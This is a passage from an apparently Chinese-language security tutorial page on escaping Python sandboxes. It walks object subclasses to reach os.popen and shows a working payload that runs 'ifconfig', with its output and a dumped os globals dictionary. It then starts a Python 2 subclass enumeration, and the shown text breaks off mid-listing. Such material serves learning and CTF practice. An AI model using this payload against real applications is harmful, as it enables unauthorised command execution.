class="string">&#x27;SC_PHYS_PAGES&#x27;</span>: <span class="number">85</span>, <span class="string">&#x27;SC_PII&#x27;</span>: <span class="number">53</span>, <span class="string">&#x27;SC_PII_INTERNET&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;SC_PII_INTERNET_DGRAM&#x27;</span>: <span class="number">62</span>, <span class="string">&#x27;SC_PII_INTERNET_STREAM&#x27;</span>: <span class="number">61</span>, <span class="string">&#x27;SC_PII_OSI&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;SC_PII_OSI_CLTS&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;SC_PII_OSI_COTS&#x27;</span>: <span class="number">63</span>, <span class="string">&#x27;SC_PII_OSI_M&#x27;</span>: <span class="number">65</span>, <span class="string">&#x27;SC_PII_SOCKET&#x27;</span>: <span class="number">55</span>, <span class="string">&#x27;SC_PII_XTI&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;SC_POLL&#x27;</span>: <span class="number">58</span>, <span class="string">&#x27;SC_PRIORITIZED_IO&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;SC_PRIORITY_SCHEDULING&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;SC_REALTIME_SIGNALS&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;SC_RE_DUP_MAX&#x27;</span>: <span class="number">44</span>, <span class="string">&#x27;SC_RTSIG_MAX&#x27;</span>: <span class="number">31</span>, <span class="string">&#x27;SC_SAVED_IDS&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;SC_SCHAR_MAX&#x27;</span>: <span class="number">111</span>, <span class="string">&#x27;SC_SCHAR_MIN&#x27;</span>: <span class="number">112</span>, <span class="string">&#x27;SC_SELECT&#x27;</span>: <span class="number">59</span>, <span class="string">&#x27;SC_SEMAPHORES&#x27;</span>: <span class="number">21</span>, <span class="string">&#x27;SC_SEM_NSEMS_MAX&#x27;</span>: <span class="number">32</span>, <span class="string">&#x27;SC_SEM_VALUE_MAX&#x27;</span>: <span class="number">33</span>, <span class="string">&#x27;SC_SHARED_MEMORY_OBJECTS&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;SC_SHRT_MAX&#x27;</span>: <span class="number">113</span>, <span class="string">&#x27;SC_SHRT_MIN&#x27;</span>: <span class="number">114</span>, <span class="string">&#x27;SC_SIGQUEUE_MAX&#x27;</span>: <span class="number">34</span>, <span class="string">&#x27;SC_SSIZE_MAX&#x27;</span>: <span class="number">110</span>, <span class="string">&#x27;SC_STREAM_MAX&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;SC_SYNCHRONIZED_IO&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;SC_THREADS&#x27;</span>: <span class="number">67</span>, <span class="string">&#x27;SC_THREAD_ATTR_STACKADDR&#x27;</span>: <span class="number">77</span>, <span class="string">&#x27;SC_THREAD_ATTR_STACKSIZE&#x27;</span>: <span class="number">78</span>, <span class="string">&#x27;SC_THREAD_DESTRUCTOR_ITERATIONS&#x27;</span>: <span class="number">73</span>, <span class="string">&#x27;SC_THREAD_KEYS_MAX&#x27;</span>: <span class="number">74</span>, <span class="string">&#x27;SC_THREAD_PRIORITY_SCHEDULING&#x27;</span>: <span class="number">79</span>, <span class="string">&#x27;SC_THREAD_PRIO_INHERIT&#x27;</span>: <span class="number">80</span>, <span class="string">&#x27;SC_THREAD_PRIO_PROTECT&#x27;</span>: <span class="number">81</span>, <span class="string">&#x27;SC_THREAD_PROCESS_SHARED&#x27;</span>: <span class="number">82</span>, <span class="string">&#x27;SC_THREAD_SAFE_FUNCTIONS&#x27;</span>: <span class="number">68</span>, <span class="string">&#x27;SC_THREAD_STACK_MIN&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;SC_THREAD_THREADS_MAX&#x27;</span>: <span class="number">76</span>, <span class="string">&#x27;SC_TIMERS&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;SC_TIMER_MAX&#x27;</span>: <span class="number">35</span>, <span class="string">&#x27;SC_TTY_NAME_MAX&#x27;</span>: <span class="number">72</span>, <span class="string">&#x27;SC_TZNAME_MAX&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;SC_T_IOV_MAX&#x27;</span>: <span class="number">66</span>, <span class="string">&#x27;SC_UCHAR_MAX&#x27;</span>: <span class="number">115</span>, <span class="string">&#x27;SC_UINT_MAX&#x27;</span>: <span class="number">116</span>, <span class="string">&#x27;SC_UIO_MAXIOV&#x27;</span>: <span class="number">60</span>, <span class="string">&#x27;SC_ULONG_MAX&#x27;</span>: <span class="number">117</span>, <span class="string">&#x27;SC_USHRT_MAX&#x27;</span>: <span class="number">118</span>, <span class="string">&#x27;SC_VERSION&#x27;</span>: <span class="number">29</span>, <span class="string">&#x27;SC_WORD_BIT&#x27;</span>: <span class="number">107</span>, <span class="string">&#x27;SC_XBS5_ILP32_OFF32&#x27;</span>: <span class="number">125</span>, <span class="string">&#x27;SC_XBS5_ILP32_OFFBIG&#x27;</span>: <span class="number">126</span>, <span class="string">&#x27;SC_XBS5_LP64_OFF64&#x27;</span>: <span class="number">127</span>, <span class="string">&#x27;SC_XBS5_LPBIG_OFFBIG&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;SC_XOPEN_CRYPT&#x27;</span>: <span class="number">92</span>, <span class="string">&#x27;SC_XOPEN_ENH_I18N&#x27;</span>: <span class="number">93</span>, <span class="string">&#x27;SC_XOPEN_LEGACY&#x27;</span>: <span class="number">129</span>, <span class="string">&#x27;SC_XOPEN_REALTIME&#x27;</span>: <span class="number">130</span>, <span class="string">&#x27;SC_XOPEN_REALTIME_THREADS&#x27;</span>: <span class="number">131</span>, <span class="string">&#x27;SC_XOPEN_SHM&#x27;</span>: <span class="number">94</span>, <span class="string">&#x27;SC_XOPEN_UNIX&#x27;</span>: <span class="number">91</span>, <span class="string">&#x27;SC_XOPEN_VERSION&#x27;</span>: <span class="number">89</span>, <span class="string">&#x27;SC_XOPEN_XCU_VERSION&#x27;</span>: <span class="number">90</span>, <span class="string">&#x27;SC_XOPEN_XPG2&#x27;</span>: <span class="number">98</span>, <span class="string">&#x27;SC_XOPEN_XPG3&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;SC_XOPEN_XPG4&#x27;</span>: <span class="number">100</span>&#125;, <span class="string">&#x27;error&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;waitid_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.waitid_result&#x27;</span>&gt;, <span class="string">&#x27;stat_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.stat_result&#x27;</span>&gt;, <span class="string">&#x27;statvfs_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.statvfs_result&#x27;</span>&gt;, <span class="string">&#x27;sched_param&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.sched_param&#x27;</span>&gt;, <span class="string">&#x27;terminal_size&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.terminal_size&#x27;</span>&gt;, <span class="string">&#x27;DirEntry&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.DirEntry&#x27;</span>&gt;, <span class="string">&#x27;times_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.times_result&#x27;</span>&gt;, <span class="string">&#x27;uname_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.uname_result&#x27;</span>&gt;, <span class="string">&#x27;_exit&#x27;</span>: &lt;built-<span class="keyword">in</span> function _exit&gt;, <span class="string">&#x27;path&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/posixpath.py&#x27;</span>&gt;, <span class="string">&#x27;curdir&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>: <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;sep&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;pathsep&#x27;</span>: <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;defpath&#x27;</span>: <span class="string">&#x27;/bin:/usr/bin&#x27;</span>, <span class="string">&#x27;extsep&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;altsep&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;devnull&#x27;</span>: <span class="string">&#x27;/dev/null&#x27;</span>, <span class="string">&#x27;supports_dir_fd&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function mknod&gt;, &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, &lt;built-<span class="keyword">in</span> function link&gt;, &lt;built-<span class="keyword">in</span> function mkfifo&gt;, &lt;built-<span class="keyword">in</span> function readlink&gt;, &lt;built-<span class="keyword">in</span> function unlink&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function mkdir&gt;, &lt;built-<span class="keyword">in</span> function rename&gt;, &lt;built-<span class="keyword">in</span> function chmod&gt;, &lt;built-<span class="keyword">in</span> function rmdir&gt;, &lt;built-<span class="keyword">in</span> function symlink&gt;, &lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;supports_effective_ids&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;supports_fd&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function scandir&gt;, &lt;built-<span class="keyword">in</span> function execve&gt;, &lt;built-<span class="keyword">in</span> function statvfs&gt;, &lt;built-<span class="keyword">in</span> function truncate&gt;, &lt;built-<span class="keyword">in</span> function listdir&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function chmod&gt;, &lt;built-<span class="keyword">in</span> function chdir&gt;, &lt;built-<span class="keyword">in</span> function pathconf&gt;&#125;, <span class="string">&#x27;supports_follow_symlinks&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function link&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;SEEK_SET&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SEEK_CUR&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SEEK_END&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;makedirs&#x27;</span>: &lt;function makedirs at <span class="number">0x7fc7ef547af0</span>&gt;, <span class="string">&#x27;removedirs&#x27;</span>: &lt;function removedirs at <span class="number">0x7fc7ef46b280</span>&gt;, <span class="string">&#x27;renames&#x27;</span>: &lt;function renames at <span class="number">0x7fc7ef46b310</span>&gt;, <span class="string">&#x27;walk&#x27;</span>: &lt;function walk at <span class="number">0x7fc7ef46b3a0</span>&gt;, <span class="string">&#x27;_walk&#x27;</span>: &lt;function _walk at <span class="number">0x7fc7ef46b430</span>&gt;, <span class="string">&#x27;fwalk&#x27;</span>: &lt;function fwalk at <span class="number">0x7fc7ef46b4c0</span>&gt;, <span class="string">&#x27;_fwalk&#x27;</span>: &lt;function _fwalk at <span class="number">0x7fc7ef46b550</span>&gt;, <span class="string">&#x27;execl&#x27;</span>: &lt;function execl at <span class="number">0x7fc7ef46b5e0</span>&gt;, <span class="string">&#x27;execle&#x27;</span>: &lt;function execle at <span class="number">0x7fc7ef46b670</span>&gt;, <span class="string">&#x27;execlp&#x27;</span>: &lt;function execlp at <span class="number">0x7fc7ef46b700</span>&gt;, <span class="string">&#x27;execlpe&#x27;</span>: &lt;function execlpe at <span class="number">0x7fc7ef46b790</span>&gt;, <span class="string">&#x27;execvp&#x27;</span>: &lt;function execvp at <span class="number">0x7fc7ef46b820</span>&gt;, <span class="string">&#x27;execvpe&#x27;</span>: &lt;function execvpe at <span class="number">0x7fc7ef46b8b0</span>&gt;, <span class="string">&#x27;_execvpe&#x27;</span>: &lt;function _execvpe at <span class="number">0x7fc7ef46b940</span>&gt;, <span class="string">&#x27;get_exec_path&#x27;</span>: &lt;function get_exec_path at <span class="number">0x7fc7ef46b9d0</span>&gt;, <span class="string">&#x27;MutableMapping&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.MutableMapping&#x27;</span>&gt;, <span class="string">&#x27;Mapping&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Mapping&#x27;</span>&gt;, <span class="string">&#x27;_Environ&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os._Environ&#x27;</span>&gt;, <span class="string">&#x27;getenv&#x27;</span>: &lt;function getenv at <span class="number">0x7fc7ef46ba60</span>&gt;, <span class="string">&#x27;supports_bytes_environ&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;environb&#x27;</span>: environ(&#123;<span class="string">b&#x27;COLORTERM&#x27;</span>: <span class="string">b&#x27;truecolor&#x27;</span>, <span class="string">b&#x27;DISPLAY&#x27;</span>: <span class="string">b&#x27;:0.0&#x27;</span>, <span class="string">b&#x27;LANG&#x27;</span>: <span class="string">b&#x27;en_US.UTF-8&#x27;</span>, <span class="string">b&#x27;LANGUAGE&#x27;</span>: <span class="string">b&#x27;&#x27;</span>, <span class="string">b&#x27;PATH&#x27;</span>: <span class="string">b&#x27;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games&#x27;</span>, <span class="string">b&#x27;TERM&#x27;</span>: <span class="string">b&#x27;xterm-256color&#x27;</span>, <span class="string">b&#x27;XAUTHORITY&#x27;</span>: <span class="string">b&#x27;/home/kali/.Xauthority&#x27;</span>, <span class="string">b&#x27;LS_COLORS&#x27;</span>: <span class="string">b&#x27;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36::ow=30;44:&#x27;</span>, <span class="string">b&#x27;MAIL&#x27;</span>: <span class="string">b&#x27;/var/mail/root&#x27;</span>, <span class="string">b&#x27;LOGNAME&#x27;</span>: <span class="string">b&#x27;root&#x27;</span>, <span class="string">b&#x27;USER&#x27;</span>: <span class="string">b&#x27;root&#x27;</span>, <span class="string">b&#x27;HOME&#x27;</span>: <span class="string">b&#x27;/root&#x27;</span>, <span class="string">b&#x27;SHELL&#x27;</span>: <span class="string">b&#x27;/usr/bin/zsh&#x27;</span>, <span class="string">b&#x27;SUDO_COMMAND&#x27;</span>: <span class="string">b&#x27;/usr/bin/su&#x27;</span>, <span class="string">b&#x27;SUDO_USER&#x27;</span>: <span class="string">b&#x27;kali&#x27;</span>, <span class="string">b&#x27;SUDO_UID&#x27;</span>: <span class="string">b&#x27;1000&#x27;</span>, <span class="string">b&#x27;SUDO_GID&#x27;</span>: <span class="string">b&#x27;1000&#x27;</span>, <span class="string">b&#x27;COMMAND_NOT_FOUND_INSTALL_PROMPT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;POWERSHELL_UPDATECHECK&#x27;</span>: <span class="string">b&#x27;Off&#x27;</span>, <span class="string">b&#x27;POWERSHELL_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;DOTNET_CLI_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;SHLVL&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;PWD&#x27;</span>: <span class="string">b&#x27;/home/kali/Desktop&#x27;</span>, <span class="string">b&#x27;OLDPWD&#x27;</span>: <span class="string">b&#x27;/home/kali&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_mb&#x27;</span>: <span class="string">b&#x27;\x1b[1;31m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_md&#x27;</span>: <span class="string">b&#x27;\x1b[1;36m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_me&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_so&#x27;</span>: <span class="string">b&#x27;\x1b[01;33m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_se&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_us&#x27;</span>: <span class="string">b&#x27;\x1b[1;32m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_ue&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;_&#x27;</span>: <span class="string">b&#x27;/usr/bin/python3&#x27;</span>&#125;), <span class="string">&#x27;getenvb&#x27;</span>: &lt;function getenvb at <span class="number">0x7fc7ef46d3a0</span>&gt;, <span class="string">&#x27;fsencode&#x27;</span>: &lt;function _fscodec.&lt;<span class="built_in">locals</span>&gt;.fsencode at <span class="number">0x7fc7ef46d4c0</span>&gt;, <span class="string">&#x27;fsdecode&#x27;</span>: &lt;function _fscodec.&lt;<span class="built_in">locals</span>&gt;.fsdecode at <span class="number">0x7fc7ef46d550</span>&gt;, <span class="string">&#x27;P_WAIT&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;P_NOWAIT&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;P_NOWAITO&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;_spawnvef&#x27;</span>: &lt;function _spawnvef at <span class="number">0x7fc7ef46d430</span>&gt;, <span class="string">&#x27;spawnv&#x27;</span>: &lt;function spawnv at <span class="number">0x7fc7ef46d5e0</span>&gt;, <span class="string">&#x27;spawnve&#x27;</span>: &lt;function spawnve at <span class="number">0x7fc7ef46d670</span>&gt;, <span class="string">&#x27;spawnvp&#x27;</span>: &lt;function spawnvp at <span class="number">0x7fc7ef46d700</span>&gt;, <span class="string">&#x27;spawnvpe&#x27;</span>: &lt;function spawnvpe at <span class="number">0x7fc7ef46d790</span>&gt;, <span class="string">&#x27;spawnl&#x27;</span>: &lt;function spawnl at <span class="number">0x7fc7ef46d820</span>&gt;, <span class="string">&#x27;spawnle&#x27;</span>: &lt;function spawnle at <span class="number">0x7fc7ef46d8b0</span>&gt;, <span class="string">&#x27;spawnlp&#x27;</span>: &lt;function spawnlp at <span class="number">0x7fc7ef46d940</span>&gt;, <span class="string">&#x27;spawnlpe&#x27;</span>: &lt;function spawnlpe at <span class="number">0x7fc7ef46d9d0</span>&gt;, <span class="string">&#x27;popen&#x27;</span>: &lt;function popen at <span class="number">0x7fc7ef46da60</span>&gt;, <span class="string">&#x27;_wrap_close&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, <span class="string">&#x27;fdopen&#x27;</span>: &lt;function fdopen at <span class="number">0x7fc7ef46daf0</span>&gt;, <span class="string">&#x27;_fspath&#x27;</span>: &lt;function _fspath at <span class="number">0x7fc7ef46dee0</span>&gt;, <span class="string">&#x27;PathLike&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.PathLike&#x27;</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p>找到popen函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;ifconfig&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.18.69.174  netmask 255.255.248.0  broadcast 10.18.71.255\n        inet6 fe80::20c:29ff:fe7d:da26  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:0c:29:7d:da:26  txqueuelen 1000  (Ethernet)\n        RX packets 16954  bytes 8157718 (7.7 MiB)\n        RX errors 0  dropped 1538  overruns 0  frame 0\n        TX packets 5464  bytes 503024 (491.2 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 187  bytes 17050 (16.6 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 187  bytes 17050 (16.6 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n&#x27;</span></span><br></pre></td></tr></table></figure><p>如果是python2那么还是用这个方法找</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>([].__class__.__bases__[<span class="number">0</span>].__subclasses__()): </span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">1</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">2</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">3</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">4</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">5</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">6</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">7</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">8</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">9</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">10</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">11</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">12</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">13</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">14</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">15</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">16</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">17</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">18</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">19</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">20</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">21</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">22</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">23</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">24</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">25</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">26</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">27</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">28</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">29</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">30</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">31</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">32</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">33</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">34</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">35</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">36</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">37</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">38</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">39</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">40</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">41</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">42</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">43</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">44</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">45</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">46</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">47</span>, &lt;<span 